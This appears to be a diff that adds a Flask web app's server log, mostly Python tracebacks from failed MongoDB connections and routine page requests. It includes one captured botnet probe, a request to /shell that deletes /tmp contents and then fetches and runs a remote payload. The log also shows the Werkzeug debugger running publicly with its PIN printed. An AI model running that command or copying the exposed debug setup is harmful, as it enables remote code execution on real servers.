+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1766, in __start_session
+    server_session = self._get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1802, in _get_server_session
+    return self._topology.get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 488, in get_server_session
+    None)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 217, in _select_servers_loop
+    (self._error_message(selector), timeout, self.description))
+pymongo.errors.ServerSelectionTimeoutError: 13.125.100.242:27017: [Errno 111] Connection refused, Timeout: 30s, Topology Description: <TopologyDescription id: 5f8d9470163dd2959b78255b, topology_type: Single, servers: [<ServerDescription ('13.125.100.242', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('13.125.100.242:27017: [Errno 111] Connection refused',)>]>
+52.177.121.220 - - [20/Oct/2020 17:25:13] "[35m[1mGET / HTTP/1.1[0m" 500 -
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 998, in emit
+    self.flush()
+  File "/usr/lib/python3.6/logging/__init__.py", line 978, in flush
+    self.stream.flush()
+OSError: [Errno 28] No space left on device
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 345, in handle
+    BaseHTTPRequestHandler.handle(self)
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 379, in handle_one_request
+    return self.run_wsgi()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 323, in run_wsgi
+    execute(self.server.app)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 315, in execute
+    write(data)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 273, in write
+    self.send_response(code, msg)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 383, in send_response
+    self.log_request(code)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 434, in log_request
+    self.log("info", '"%s" %s %s', msg, code, size)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/serving.py", line 446, in log
+    % (self.address_string(), self.log_date_time_string(), message % args),
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/werkzeug/_internal.py", line 113, in _log
+    getattr(_logger, type)(message.rstrip(), *args, **kwargs)
+Message: '162.220.146.69 - - [21/Oct/2020 02:39:45] "\x1b[33mGET /shell?cd+/tmp;rm+-rf+*;wget+212.83.141.42/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1\x1b[0m" 404 -'
+Arguments: ()
+124.49.105.89 - - [21/Oct/2020 03:04:20] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 30, in home
+    question_list = list(db.questions.find({}))
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1207, in next
+    if len(self.__data) or self._refresh():
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1100, in _refresh
+    self.__session = self.__collection.database.client._ensure_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1816, in _ensure_session
+    return self.__start_session(True, causal_consistency=False)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1766, in __start_session
+    server_session = self._get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1802, in _get_server_session
+    return self._topology.get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 488, in get_server_session
+    None)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 217, in _select_servers_loop
+    (self._error_message(selector), timeout, self.description))
+pymongo.errors.ServerSelectionTimeoutError: 13.125.100.242:27017: [Errno 111] Connection refused, Timeout: 30s, Topology Description: <TopologyDescription id: 5f8d9470163dd2959b78255b, topology_type: Single, servers: [<ServerDescription ('13.125.100.242', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('13.125.100.242:27017: [Errno 111] Connection refused',)>]>
+124.49.105.89 - - [21/Oct/2020 03:04:26] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "app.py", line 3, in <module>
+    import shortuuid
+ModuleNotFoundError: No module named 'shortuuid'
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:05:23] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 30, in home
+    question_list = list(db.questions.find({}))
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1207, in next
+    if len(self.__data) or self._refresh():
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1100, in _refresh
+    self.__session = self.__collection.database.client._ensure_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1816, in _ensure_session
+    return self.__start_session(True, causal_consistency=False)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1766, in __start_session
+    server_session = self._get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1802, in _get_server_session
+    return self._topology.get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 488, in get_server_session
+    None)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 217, in _select_servers_loop
+    (self._error_message(selector), timeout, self.description))
+pymongo.errors.ServerSelectionTimeoutError: 13.125.100.242:27017: [Errno 111] Connection refused, Timeout: 30s, Topology Description: <TopologyDescription id: 5f8fa552a4f888826a62720a, topology_type: Single, servers: [<ServerDescription ('13.125.100.242', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('13.125.100.242:27017: [Errno 111] Connection refused',)>]>
+124.49.105.89 - - [21/Oct/2020 03:05:23] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:05:23] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:05:23] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:05:23] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:05:24] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:05:24] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+ * Detected change in '/home/ubuntu/booksalon_flask/app.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:06:28] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 30, in home
+    question_list = list(db.questions.find({}))
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1207, in next
+    if len(self.__data) or self._refresh():
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1100, in _refresh
+    self.__session = self.__collection.database.client._ensure_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1816, in _ensure_session
+    return self.__start_session(True, causal_consistency=False)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1766, in __start_session
+    server_session = self._get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1802, in _get_server_session
+    return self._topology.get_server_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 488, in get_server_session
+    None)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/topology.py", line 217, in _select_servers_loop
+    (self._error_message(selector), timeout, self.description))
+pymongo.errors.ServerSelectionTimeoutError: 13.125.100.242:27017: [Errno 111] Connection refused, Timeout: 30s, Topology Description: <TopologyDescription id: 5f8fa591be594b3fbdc0b492, topology_type: Single, servers: [<ServerDescription ('13.125.100.242', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('13.125.100.242:27017: [Errno 111] Connection refused',)>]>
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:03] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:30] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:08:31] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+203.133.180.83 - - [21/Oct/2020 03:11:48] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:49] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:50] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:11:51] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [21/Oct/2020 03:11:54] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[36mGET /static/js/function.js HTTP/1.1[0m" 304 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[36mGET /static/css/variables.css HTTP/1.1[0m" 304 -
+124.49.105.89 - - [21/Oct/2020 03:12:11] "[36mGET /static/css/check.css HTTP/1.1[0m" 304 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:33] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:13:45] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:25] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:30] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:30] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:30] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:31] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:43] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:43] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:15:44] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:09] "[37mGET /checkpw?id=5f8d8ac147639fbc089365da&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:10] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:15] "[32mPOST /check_password?id=5f8d8ac147639fbc089365da&reply_id=&type=q HTTP/1.1[0m" 302 -
